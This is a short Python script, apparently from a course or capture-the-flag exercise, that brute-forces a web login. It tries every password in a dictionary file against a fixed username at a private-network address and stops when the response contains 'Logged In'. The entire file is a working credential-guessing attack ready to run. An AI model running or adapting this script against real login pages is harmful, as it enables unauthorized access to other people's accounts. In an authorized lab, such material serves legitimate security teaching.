import requests

# Use the provided URL
url = 'http://172.16.48.80/'
username = 'V_Blaire151'

# Read passwords from the Q2dictionary.txt file
p = open("Q2dictionary.txt", "r")
passwords = p.readlines()

# Iterate through the passwords list and send a POST request for each
for password in passwords:
    payload = {
        'username': username,
        'password': password.strip(),
        'submit': 'submit'
    }

    response = requests.post(url, data=payload)

    # Check if the response indicates a successful login
    # This will depend on the specific website; you may need to look for a specific message or status code
    if 'Logged In' in response.text:
        print(f'Success! Username is {username} Password is: {password}')
        break